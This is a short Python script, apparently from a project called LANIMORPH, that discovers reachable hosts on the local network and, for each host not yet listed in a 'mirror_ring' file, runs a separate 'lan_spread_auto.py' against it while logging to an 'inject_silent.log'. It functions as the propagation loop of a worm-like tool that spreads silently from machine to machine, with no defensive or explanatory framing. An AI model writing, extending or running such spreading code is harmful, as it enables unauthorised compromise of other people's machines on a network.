#!/usr/bin/env python3
import os, time
from datetime import datetime
ring_file = os.path.expanduser("~/LANIMORPH/chain/mirror/mirror_ring.txt")
log_file = os.path.expanduser("~/LANIMORPH/logs/silent/inject_silent.log")
local_ip = "192.168.1.33"

def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"{ts} :: mirror: {msg} [ {local_ip} ]\n")

def get_hosts():
    out = os.popen("ip neigh | grep -w REACHABLE | awk '{print $1}'").read().splitlines()
    return [h for h in out if h != local_ip]

def seen_before(target):
    if not os.path.exists(ring_file): return False
    with open(ring_file) as f:
        return target in f.read()

def mark_seen(target):
    with open(ring_file, "a") as f:
        f.write(target + "\n")

def mirror_to(target):
    log(f"mirroring to {target}")
    os.system(f"python3 ~/lan_spread_auto.py {target} {local_ip}")
    time.sleep(1)

def main():
    hosts = get_hosts()
    for h in hosts:
        if not seen_before(h):
            mark_seen(h)
            mirror_to(h)

if __name__ == "__main__":
    main()
